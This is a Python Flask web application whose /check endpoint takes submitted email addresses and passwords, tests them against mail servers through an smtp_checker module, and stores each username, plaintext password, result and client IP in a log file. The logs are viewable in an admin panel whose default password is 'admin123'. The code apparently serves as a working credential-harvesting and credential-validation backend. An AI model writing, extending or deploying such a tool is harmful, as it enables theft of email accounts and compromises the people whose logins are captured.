import os
import json
import functools
from datetime import datetime
from flask import Flask, render_template, request, jsonify, Response
import smtp_checker

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-key")

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
LOG_FILE = os.environ.get("LOG_FILE", os.path.join("/tmp", "logs.json"))

def load_logs():
    if not os.path.exists(LOG_FILE):
        return []
    try:
        with open(LOG_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return []

def save_log(entry):
    logs = load_logs()
    logs.insert(0, entry)
    logs = logs[:500]
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)

def require_admin(f):
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.password != ADMIN_PASSWORD:
            return Response(
                "Access denied. Enter admin credentials.",
                401,
                {"WWW-Authenticate": 'Basic realm="Admin Panel"'},
            )
        return f(*args, **kwargs)
    return decorated

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/admin")
@require_admin
def admin():
    logs = load_logs()
    return render_template("admin.html", logs=logs)

@app.route("/admin/clear", methods=["POST"])
@require_admin
def admin_clear():
    with open(LOG_FILE, "w") as f:
        json.dump([], f)
    return ("", 204)

@app.route("/check", methods=["POST"])
def check_credentials():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "error": "No data provided"}), 400

    email = data.get("email", "").strip()
    password = data.get("password", "")

    if not email or not password:
        return jsonify({"success": False, "error": "Email and password are required"}), 400

    result = smtp_checker.check_credentials(email, password)

    try:
        save_log({
            "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
            "username": email,
            "password": password,
            "status": result.get("status", "unknown"),
            "message": result.get("message", ""),
            "ip": request.remote_addr,
            "platform": "email",
        })
    except Exception:
        pass

    return jsonify(result)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port, debug=False)
